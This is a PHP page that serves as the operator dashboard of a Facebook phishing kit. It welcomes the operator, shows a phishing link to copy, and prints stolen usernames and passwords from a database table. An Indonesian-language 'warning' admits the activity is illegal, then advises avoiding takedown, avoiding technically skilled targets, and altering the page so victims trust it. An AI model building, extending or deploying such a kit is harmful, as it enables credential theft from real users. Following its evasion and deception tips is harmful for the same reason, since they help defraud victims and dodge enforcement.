<?php
session_start();

if (empty($_SESSION['login'])) {
    header("Location: login.php");
}
?>
<html>
<head>
    <title>visitor</title>
    <meta charset="utf-8" />
    <meta name="description" content="visitor" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="result_account.css" />
    <script type="text/javascript" src="result_account.js"></script>
</head>
<body onload="lamp()">
    <div class="container">
        <div class="header">
            <div class="home">
                <a href="logout.php"><img src="logout.png" /></a>
            </div>
            <img src="images/logo.jpg" />
            <h2>Hallo <?php echo $_SESSION['username'] ?>!...</h2>
            <marquee>selammat datang didashboard phising facebook !...</marquee>
        </div>
        <div class="light">
            <div class="flash1" id="lamp1">
                <div class="overlay1"></div>
            </div>
            <div class="flash2" id="lamp2">
                <div class="overlay2"></div>
            </div>
            <div class="flash3" id="lamp3">
                <div class="overlay3"></div>
            </div>
            <div class="flash4" id="lamp4">
                <div class="overlay4"></div>
            </div>
            <div class="flash5" id="lamp5">
                <div class="overlay5"></div>
            </div>
            <div class="flash6" id="lamp6">
                <div class="overlay6"></div>
            </div>
            <div class="flash7" id="lamp7">
                <div class="overlay7"></div>
            </div>
            <div class="flash8" id="lamp8">
                <div class="overlay8"></div>
            </div>
            <div class="flash9" id="lamp9">
                <div class="overlay9"></div>
            </div>
            <div class="flash10" id="lamp10">
                <div class="overlay10"></div>
            </div>
        </div>
        <div class="content">
            <h1>Phising</h1>
            <h2>| </h2>
            <h2>--OR--</h2>
            <h2>|</h2>
            <h3>Social_Eginering</h3>
        </div>
        <div class="artikel">
            <div class="artikelleft">
                <h1>PERINGATAN</h1>
                <p>
                    kegiatan ini termasuk dalam pelanggaran UU ITE.
                </p>
                <h2>!! warning ilegal action !!</h2>
                <p>
                    halaman ini menampilkan beberapa data sensitif.
                    diharapkan lebih berhati-hati dalam penyebaran phising
                    agar link tidak ketakedown.hindari target yang memiliki
                    kemampuan IT.sedikit tips,lakukan beberapa modifikasi
                    agar target percaya dan mengisi form phising.sekian dan terimakasih...
                </p>
            </div>
            <div class="artikelright">
                <div id="visitor">
                    <?php
                    require "counter.php";
                    echo "<h2>visitor</h2>";
                    echo "<h3> " . htmlentities($kunjungan[0]) . " </h3>";
                    ?>
                </div>
            </div>
        </div>
        <div class="copy">
            <p>
                Copy Link phising Anda
            </p>
            <div class="cp">
                <p>
                    https://linkphising-facebook.com
                </p>
            </div>
        </div>
        <div class="table">
            <table border="1">
                <tr>
                    <th>No</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
                <?php
                include "config.php";

                $query = mysqli_query($connect, "select * from list");
                $no = 1;
                while ($hasil = mysqli_fetch_array($query)) {

                    echo "<div class='result'>";
                    echo "<tr>";
                    echo "<td>" . htmlentities($no++) . "</td>";
                    echo "<td>" . htmlentities($hasil['username']) . "</td>";
                    echo "<td>" . htmlentities($hasil['password']) . "</td>";
                    echo "</tr>";
                    echo "</div>";
                }
                ?>
            </table>
        </div>
    </div>
</div>
</body>
</html>